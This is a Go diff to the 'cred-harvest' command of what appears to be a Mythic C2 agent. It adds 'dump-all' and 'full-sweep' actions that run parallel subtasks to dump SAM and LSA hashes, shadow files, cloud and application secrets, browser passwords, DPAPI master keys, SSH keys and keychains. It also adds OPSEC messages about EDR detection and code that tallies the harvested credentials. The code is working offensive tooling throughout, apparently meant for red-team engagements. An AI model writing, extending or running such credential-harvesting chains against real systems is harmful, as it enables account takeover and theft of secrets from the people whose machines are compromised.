@@ -34,23 +34,33 @@ func init() {
 				Name:             "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). all: run all platform-appropriate actions.",
-				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens"},
+				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). all: run all platform-appropriate actions. dump-all: automated chain — runs hashdump + lsa-secrets + cred-harvest all in parallel via subtasks (Windows).",
+				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "dump-all", "full-sweep"},
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
 				},
 			},
 			{
-				Name:             "user",
-				ModalDisplayName: "User Filter",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:      "Filter results by username (optional)",
+				Name:                 "user",
+				ModalDisplayName:     "User Filter",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DynamicQueryFunction: getCallbackUserList,
+				Description:          "Filter results by username (optional)",
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 1},
 				},
 			},
+		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: Credential harvesting completed. File access logs generated for /etc/shadow, cloud config files, shell history, and application secrets. EDR file-read telemetry may flag access to credential stores. Harvested credentials registered in Mythic vault — rotate compromised credentials after engagement.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -130,12 +140,20 @@ func init() {
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
+			msg := fmt.Sprintf("OPSEC WARNING: Credential harvesting (action: %s). Accesses system files, cloud configs, shell history, and application secrets. File access patterns may trigger EDR behavioral alerts (T1552.001, T1552.003, T1552.004).", action)
+			if action == "dump-all" {
+				msg = "OPSEC WARNING: Credential Harvest Chain will execute hashdump + lsa-secrets + cred-harvest simultaneously. This triggers SAM/LSA access (requires SYSTEM), reads shadow hashes, cloud configs, and shell history. Combined footprint: memory access to LSASS/SAM, file reads across user profiles, and DPAPI decryption. High detection risk from multiple credential access techniques in rapid succession (T1003.002, T1003.004, T1003.005, T1552)."
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID: taskData.Task.ID, Success: true,
-				OpsecPreBlocked: false,
-				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: Credential harvesting (action: %s). Accesses system files, cloud configs, shell history, and application secrets. File access patterns may trigger EDR behavioral alerts (T1552.001, T1552.003, T1552.004).", action),
+				OpsecPreBlocked:    false,
+				OpsecPreMessage:    msg,
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
+		},
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"dumpAllComplete":  credHarvestDumpAllComplete,
+			"fullSweepComplete": credHarvestFullSweepComplete,
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
@@ -145,6 +163,84 @@ func init() {
 
 			action, _ := taskData.Args.GetStringArg("action")
 			user, _ := taskData.Args.GetStringArg("user")
+
+			// dump-all: create parallel subtask group (hashdump + lsa-secrets dump + cred-harvest all)
+			if action == "dump-all" {
+				display := "Credential Harvest Chain (hashdump + lsa-secrets + cred-harvest)"
+				response.DisplayParams = &display
+				completionFunc := "dumpAllComplete"
+				response.CompletionFunctionName = &completionFunc
+
+				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+					{CommandName: "hashdump", Params: "{}"},
+					{CommandName: "lsa-secrets", Params: `{"action":"dump"}`},
+					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
+				}
+
+				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
+					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+						TaskID:                taskData.Task.ID,
+						GroupName:             "credential_harvest_chain",
+						GroupCallbackFunction: &completionFunc,
+						Tasks:                 tasks,
+					},
+				)
+				if err != nil || !groupResult.Success {
+					errMsg := "Failed to create subtask group"
+					if err != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", err.Error())
+					} else if groupResult != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", groupResult.Error)
+					}
+					response.Success = false
+					response.Error = errMsg
+					return response
+				}
+
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					"Credential Harvest Chain: hashdump + lsa-secrets + cred-harvest all (parallel)")
+				return response
+			}
+
+			// full-sweep: exhaustive credential collection (cred-harvest all + browser + dpapi + ssh-keys + keychain)
+			if action == "full-sweep" {
+				display := "Full Credential Sweep (cred-harvest + browser + dpapi + ssh-keys + keychain)"
+				response.DisplayParams = &display
+				completionFunc := "fullSweepComplete"
+				response.CompletionFunctionName = &completionFunc
+
+				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
+					{CommandName: "browser", Params: `{"action":"passwords"}`},
+					{CommandName: "dpapi", Params: `{"action":"masterkeys"}`},
+					{CommandName: "ssh-keys", Params: `{"action":"list"}`},
+					{CommandName: "keychain", Params: `{}`},
+				}
+
+				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
+					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+						TaskID:                taskData.Task.ID,
+						GroupName:             "credential_full_sweep",
+						GroupCallbackFunction: &completionFunc,
+						Tasks:                 tasks,
+					},
+				)
+				if err != nil || !groupResult.Success {
+					errMsg := "Failed to create full sweep subtask group"
+					if err != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", err.Error())
+					} else if groupResult != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", groupResult.Error)
+					}
+					response.Success = false
+					response.Error = errMsg
+					return response
+				}
+
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					"Full Credential Sweep: cred-harvest + browser + dpapi + ssh-keys + keychain (parallel)")
+				return response
+			}
 
 			displayParams := action
 			if user != "" {
@@ -167,3 +263,151 @@ func init() {
 		},
 	})
 }
+
+// credHarvestDumpAllComplete aggregates results from the parallel credential harvest subtask group.
+func credHarvestDumpAllComplete(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	// Gather all completed subtask responses
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+
+	if err != nil || !searchResult.Success {
+		completed := true
+		response.Completed = &completed
+		summary := "Credential Harvest Chain completed (could not aggregate results)"
+		response.Stdout = &summary
+		return response
+	}
+
+	// Aggregate results from each subtask
+	var summaryParts []string
+	successCount := 0
+	errorCount := 0
+
+	for _, task := range searchResult.Tasks {
+		status := "unknown"
+		if task.Completed {
+			if task.Status == "error" {
+				status = "ERROR"
+				errorCount++
+			} else {
+				status = "SUCCESS"
+				successCount++
+			}
+		}
+
+		summaryParts = append(summaryParts, fmt.Sprintf("[%s] %s: %s", status, task.CommandName, task.DisplayParams))
+
+		// Fetch response text for each subtask
+		respSearch, respErr := mythicrpc.SendMythicRPCResponseSearch(mythicrpc.MythicRPCResponseSearchMessage{
+			TaskID: task.ID,
+		})
+		if respErr == nil && respSearch.Success && len(respSearch.Responses) > 0 {
+			// Count credentials found (rough heuristic: count lines with hashes or key=value patterns)
+			for _, resp := range respSearch.Responses {
+				text := string(resp.Response)
+				lines := strings.Split(text, "\n")
+				credCount := 0
+				for _, line := range lines {
+					if strings.Contains(line, ":$") || strings.Contains(line, ":::") ||
+						(strings.Contains(line, "=") && (strings.Contains(strings.ToLower(line), "password") || strings.Contains(strings.ToLower(line), "secret") || strings.Contains(strings.ToLower(line), "token"))) {
+						credCount++
+					}
+				}
+				if credCount > 0 {
+					summaryParts = append(summaryParts, fmt.Sprintf("  → %d potential credentials found", credCount))
+				}
+			}
+		}
+	}
+
+	completed := true
+	response.Completed = &completed
+	summary := fmt.Sprintf("=== Credential Harvest Chain Complete ===\nSubtasks: %d success, %d errors\n\n%s",
+		successCount, errorCount, strings.Join(summaryParts, "\n"))
+	response.Stdout = &summary
+
+	// Also create a response on the parent task so it shows in the UI
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   parentID,
+		Response: []byte(summary),
+	})
+
+	return response
+}
+
+// credHarvestFullSweepComplete aggregates results from the full credential sweep subtask group.
+func credHarvestFullSweepComplete(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+
+	if err != nil || !searchResult.Success {
+		completed := true
+		response.Completed = &completed
+		summary := "Full Credential Sweep completed (could not aggregate results)"
+		response.Stdout = &summary
+		return response
+	}
+
+	var summaryParts []string
+	successCount := 0
+	errorCount := 0
+
+	for _, task := range searchResult.Tasks {
+		status := "unknown"
+		if task.Completed {
+			if task.Status == "error" {
+				status = "ERROR"
+				errorCount++
+			} else {
+				status = "SUCCESS"
+				successCount++
+			}
+		}
+		summaryParts = append(summaryParts, fmt.Sprintf("[%s] %s: %s", status, task.CommandName, task.DisplayParams))
+	}
+
+	completed := true
+	response.Completed = &completed
+	summary := fmt.Sprintf("=== Full Credential Sweep Complete ===\nSubtasks: %d success, %d errors\n\n%s",
+		successCount, errorCount, strings.Join(summaryParts, "\n"))
+	response.Stdout = &summary
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   parentID,
+		Response: []byte(summary),
+	})
+
+	return response
+}
+
+// getSubtaskResponses fetches all response text for a given task ID.
+func getSubtaskResponses(taskID int) string {
+	respSearch, err := mythicrpc.SendMythicRPCResponseSearch(mythicrpc.MythicRPCResponseSearchMessage{
+		TaskID: taskID,
+	})
+	if err != nil || !respSearch.Success || len(respSearch.Responses) == 0 {
+		return ""
+	}
+	var parts []string
+	for _, resp := range respSearch.Responses {
+		parts = append(parts, string(resp.Response))
+	}
+	return strings.Join(parts, "\n")
+}
+
